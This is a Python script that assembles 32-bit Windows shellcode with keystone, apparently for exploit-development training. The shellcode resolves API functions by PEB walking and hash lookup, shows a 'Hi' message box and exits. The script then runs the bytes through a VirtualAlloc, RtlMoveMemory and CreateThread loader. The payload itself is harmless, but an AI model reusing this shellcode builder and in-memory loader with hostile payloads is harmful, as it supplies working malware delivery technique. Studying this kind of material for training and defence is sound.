""" 
Messagebox
Remove int3 command in start:
"""

import sys
import ctypes
import keystone

from struct import pack

"""
Find base address of kernel32.dll (Using the PEB method)
Resolve kernel32.dll's exported functions (LoadLibraryA and GetProcAddress)

"""


def create_assembly():

    code = (
        " start:                            "
        "   add   esp, 0xfffff9f0;          "  # Decrement esp to provide space for the frame (avoid NULL bytes)

        " find_kernel32:                    "  # Store base address of kernel32 in EBX
        "   xor   ecx, ecx;                 "  # ECX = 0
        "   mov   esi,fs:[0x30];            "  # ESI = &(PEB)
        "   mov   esi,[esi+0x0C];           "  # ESI = PEB->Ldr
        "   mov   esi,[esi+0x1C];           "  # ESI = PEB->Ldr.InInitializationOrder

        " next_module:                      "  # Dynamically load base address of kernel32 into EBX
        "   mov   ebx, [esi+0x8];           "  # EBX = InInitializationOrder[i].base_address
        "   mov   edi, [esi+0x20];          "  # EDI = InInitializationOrder[i].module_name
        "   mov   esi, [esi];               "  # ESI = InInitializationOrder[i].flink (next)
        "   cmp   [edi+12*2], cx;           "  # Check null byte terminator (cx = 0x00)
        "   jne   next_module;              "  # No: try next module.

        " find_function_shorten:            "  #
        "   jmp   find_function_shorten_bnc;"  #

        " find_function_ret:                "  #
        "   pop   dword ptr [ebp+0x04];     "  # EBP+4 -> find_function
        "   jmp   resolve_symbols_kernel32; "  #

        " find_function_shorten_bnc:        "  #
        "   call  find_function_ret;        "  # 

        " find_function:                    "  # (Set EAX to VMA of function. Takes function name hash as arg and uses DLL base address in EBX).
        "   pushad;                         "  # Save all registers
        "   mov   eax, [ebx+0x3c];          "  # EAX = Offset to PE Signature (from base address of DLL)
        "   mov   edi, [ebx+eax+0x78];      "  # EDI = Export Table Directory Relative Virtual Address
        "   add   edi, ebx;                 "  # EDI = Export Table Directory Virtual Memory Address
        "   mov   ecx, [edi+0x18];          "  # ECX = NumberOfNames
        "   mov   eax, [edi+0x20];          "  # EAX = AddressOfNames RVA
        "   add   eax, ebx;                 "  # EAX = AddressOfNames VMA
        "   mov   [ebp-4], eax;             "  # Save AddressOfNames VMA for later

        " get_next_function:                "  # (Set ESI to address of function name)
        "   jecxz find_function_finished;   "  # Jump to end if ECX is 0 (reached end of array without finding symbol name)
        "   dec   ecx;                      "  # ECX -= 1 (NumberOfNames)
        "   mov   eax, [ebp-4];             "  # EAX = AddressOfNames VMA
        "   mov   esi, [eax+ecx*4];         "  # ESI = current symbol name RVA
        "   add   esi, ebx;                 "  # ESI = current symbol name VMA

        " compute_hash:                     "  #
        "   xor   eax, eax;                 "  # NULL EAX
        "   cdq;                            "  # NULL EDX
        "   cld;                            "  # From now on, string operations increment esi and edi

        " compute_hash_again:               "  #
        "   lodsb;                          "  # Load the next byte from esi into al (string op)
        "   test  al, al;                   "  # Check for NULL terminator
        "   jz    compute_hash_finished;    "  # If the ZF is set, we've hit the NULL term
        "   ror   edx, 0x0d;                "  # Rotate edx 13 bits to the right
        "   add   edx, eax;                 "  # Add the new byte to the accumulator
        "   jmp   compute_hash_again;       "  # Next iteration

        " compute_hash_finished:            "  #

        " find_function_compare:            "  #
        "   cmp   edx, [esp+0x24];          "  # Compare the computed hash with the requested hash
        "   jnz   get_next_function;        "  # If it doesn't match, go back to find_function_loop
        "   mov   edx, [edi+0x24];          "  # EDX = AddressOfNameOrdinals RVA
        "   add   edx, ebx;                 "  # EDX = AddressOfNameOrdinals VMA
        "   mov   cx,  [edx+2*ecx];         "  # CX = Extrapolate the function's ordinal
        "   mov   edx, [edi+0x1c];          "  # EDX = AddressOfFunctions RVA
        "   add   edx, ebx;                 "  # EDX = AddressOfFunctions VMA
        "   mov   eax, [edx+4*ecx];         "  # EAX = Function RVA
        "   add   eax, ebx;                 "  # EAX = Function VMA
        "   mov   [esp+0x1c], eax;          "  # Overwrite stack version of eax from pushad

        " find_function_finished:           "  #
        "   popad;                          "  # Restore registers
        "   ret;                            "  #

        " resolve_symbols_kernel32:         "  # Save addresses of various functions to call later
        "   push  0x78b5b983;               "  # TerminateProcess hash
        "   call  dword ptr [ebp+0x04];     "  # Call find_function; EAX = TerminateProcess VMA
        "   mov   [ebp+0x10], eax;          "  # Save TerminateProcess address on stack
        "   push  0xec0e4e8e;               "  # LoadLibraryA hash
        "   call  dword ptr [ebp+0x04];     "  # Call find_function; EAX = LoadLibraryA VMA
        "   mov   [ebp+0x14], eax;          "  # Save LoadLibraryA address

        " load_user32:                      "  #(Store base address of a DLL in EAX)
        "   push  0x6c6c;                   "  # Push '\0\0ll' onto stack
        "   push  0x642e3233;               "  # Push 'd.23' onto stack
        "   push  0x72657375;               "  # Push 'resu' onto stack ('user32.dll')
        "   push  esp;                      "  # Push ESP to have a pointer to the string
        "   call dword ptr [ebp+0x14];      "  # Call LoadLibraryA

        " resolve_symbols_user32:           "  # (Store MessageBox VMA on stack)
        "   mov   ebx, eax;                 "  # Move the base address of user32.dll to EBX
        "   push  0xbc4da2a8;               "  # MessageBox hash
        "   call dword ptr [ebp+0x04];      "  # Call find_function; EAX = MessageBox VMA
        "   mov   [ebp+0x1C], eax;          "  # Save MessageBox address

        " call_messagebox:                  "  #
        "   xor   eax, eax;                 "  # Null EAX
        "   push   eax;                     "  # Null terminator
        "   push  0x4445534f;               "  # "OSED"
        "   mov   edi, esp;                 "  # EDI -> "OSED"
        "   push  0x6948;                   "  # "Hi"
        "   mov   esi, esp;                 "  # ESI -> "Hi"
        "   push  eax;                      "  # uType = NULL (One 'OK' button)
        "   push  edi;                      "  # lpCaption = "MessageBox"
        "   push  esi;                      "  # lpText = "Shellcode executed"
        "   push  eax;                      "  # hWnd = NULL (No owner)
        "   call dword ptr [ebp+0x1C];      "  # Call MessageBox

        " exit_cleanly:                     "  # (Prevent crash)
        "   xor   ecx, ecx;                 "  # Null ECX
        "   push  ecx;                      "  # uExitCode
        "   push  0xffffffff;               "  # hProcess
        "   call  dword ptr [ebp+0x10];     "  # Call TerminateProcess
    )

    return code


def to_hex(input):
    if '.' in input:
        return '0x' + ''.join(reversed([format(int(octet), '02x') for octet in input.split('.')]))
    else:
        port = int(input)
        return '0x' + format(port, '04x')[2:] + format(port, '04x')[:2]


def main():

    # Initialize engine in X86-32bit mode
    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)

    code = create_assembly()

    # Create shellcode from assembly
    encoding, count = ks.asm(code)
    print(f"[*] Encoded {count} instructions")

    # Format shellcode
    sh = b""
    for e in encoding:
        sh += pack("B", e)
    shellcode = bytearray(sh)

    print(f"[+] Shellcode is {len(shellcode)} bytes")

    formatted_output = "".join(f"\\x{byte:02x}" for byte in shellcode)
    print(f'[*] Generated shellcode = "{formatted_output}"')

    runningOnWindows = input(f"[+] Are you running on Windows [Y/n]? ").lower() not in [
        "n",
        "no",
    ]
    if not runningOnWindows:
        print(f"[-] Run on Windows to continue!")
        exit()

    # Allocate virtual memory to store shellcode
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(shellcode)),
        ctypes.c_int(0x3000),
        ctypes.c_int(0x40),
    )

    if not ptr:
        print(f"[-] Could not allocate virtual memory!")
        raise ctypes.WinError()

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    # Copy shellcode to allocation address
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))
    )

    print(f"[+] Shellcode located at address {hex(ptr)}")
    input(f"[?] Press Enter to execute shellcode...")

    hThread = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_int(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0)),
    )

    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(hThread), ctypes.c_int(-1))


if __name__ == "__main__":
    main()

